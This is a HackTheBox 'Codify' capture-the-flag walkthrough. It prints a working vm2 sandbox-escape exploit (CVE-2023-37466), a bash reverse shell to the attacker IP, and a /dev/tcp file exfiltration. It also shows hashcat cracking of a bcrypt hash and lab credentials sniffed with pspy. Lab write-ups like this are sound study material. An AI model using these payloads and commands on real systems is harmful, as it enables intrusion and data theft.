---
title: Codify
tags:
  - HackTheBox
  - Easy
  - Linux
  - Nodejs
  - vm2
  - Sandbox-Escaping
  - Brute-Forcing
  - pspy
  - Code_Review
date: 2025-02-17T00:00:00Z
---
![](Pasted%20image%2020250217110028.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.239 codify.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- codify.htb > sC.txt

[redacted]
PORT   STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http
|_http-title: Codify
3000/tcp open  ppp
```

So I checked its website:

![](Pasted%20image%2020250217110149.png)

As the website says: *"This website allows you to test your Node.js code in a sandbox environment. Enter your code in the editor and see the output in real-time."*, so I can test any code I want. 

Inspecting the `/About` endpoint I discovered a library called `vm2` being used:

![](Pasted%20image%2020250217111621.png)

The current version is [3.9.16](https://github.com/patriksimek/vm2/releases/tag/3.9.16)

## Weaponization

I searched for "*vm2 exploit*" and got [This exploit](https://www.exploit-db.com/exploits/51898):

```js
/*
# Exploit Title: vm2 Sandbox Escape vulnerability
# Date: 23/12/2023
# Exploit Author: Calil Khalil & Adriel Mc Roberts
# Vendor Homepage: https://github.com/patriksimek/vm2
# Software Link: https://github.com/patriksimek/vm2
# Version: vm2 <= 3.9.19
# Tested on: Ubuntu 22.04
# CVE : CVE-2023-37466
*/

const { VM } = require("vm2");
const vm = new VM();

const command = 'pwd'; // Change to the desired command

const code = `
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}

try {
    const handler = {
        getPrototypeOf(target) {
            (function stack() {
                new Error().stack;
                stack();
            })();
        }
    };

    const proxiedErr = new Proxy({}, handler);

    throw proxiedErr;
} catch ({ constructor: c }) {
    const childProcess = c.constructor('return process')().mainModule.require('child_process');
    childProcess.execSync('${command}');
}
`;

console.log(vm.run(code));
```

## Exploitation

I executed the sript but changing the command to `id`:

![](Pasted%20image%2020250217112054.png)

> Got RCE, so time to get a shell :D

```shell
const command = 'bash -c "bash -i >& /dev/tcp/10.10.14.27/666 0>&1"';
```

> Got a shell :D

![](Pasted%20image%2020250217112314.png)

## Pivoting

I noticed a user called `joshua` with home directory.

I can read `/etc/passwd`:

```shell
joshua:x:1000:1000:,,,:/home/joshua:/bin/bash
```

I searched for `.db` like:

```shell
find / -type f -name "*.db*" 2>/dev/null

[redacted]
/var/www/contact/tickets.db
```

I'll send this db to my machine. As the machine doesn't have python installed, I'll try another way:

```shell
# In my machine start a nc listener to receive the file
nc -lnvp 888 > tickets.db

# Then in the victim's machine
cat /var/www/contact/tickets.db > /dev/tcp/10.10.14.27/888
```

I can now open it with SqliteBrowser:

![](Pasted%20image%2020250217113658.png)

So now I've got joshua's hash: `$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2` which seems to be in bcrypt format. So I'll use hashcat to crack it:

```shell
hashcat -m 3200 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt

[redacted]
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1
```

> So I've got creds :D `joshua:spongebob1`

![](Pasted%20image%2020250217114044.png)

### User flag

![](Pasted%20image%2020250217114132.png)

## Privilege Escalation

If I check for sudo vulnerability:

```shell
sudo -l

[redacted]
(root) /opt/scripts/mysql-backup.sh
```

![](Pasted%20image%2020250217114319.png)

After inspecting the script I noticed that the password passed to mysql is not the same as we input, so if I could bypass the input I would be able to become root. 

- Check this blog about [Bash Pitfalls](https://mywiki.wooledge.org/BashPitfalls#A.5B_.24foo_.3D_.22bar.22_.5D)

I can use a snooping tool to monitor the processes like [pspy](https://github.com/DominicBreuker/pspy) for this.

I'll upload it to the machine and then use two different ssh sessions: one to execute the script and the other one to execute pspy:

```shell
# In my machine
python3 -m http.server 8090

# In codify.htb [ssh session1]
wget http://10.10.14.27:8090/pspy64s
chmod +x pspy64s
./pspy64s -i 1

# In codify.htb [ssh session2]
sudo /opt/scripts/mysql-backup.sh

# In codify.htb [ssh session1] Provide as password: *
```

- The `-i 1` option means updating the log each 1 second

![](Pasted%20image%2020250217115712.png)

![](Pasted%20image%2020250217115728.png)

We can see in cleartext the password: `root:kljh12k3jhaskjh12kjh3`
- Remember to eliminate the `p` after `-`, I was stuck 5 mins here xd

> I can now log in as root and read root flag :D

![](Pasted%20image%2020250217120546.png)
### Root flag

![](Pasted%20image%2020250217120625.png)

==Machine pwned!==

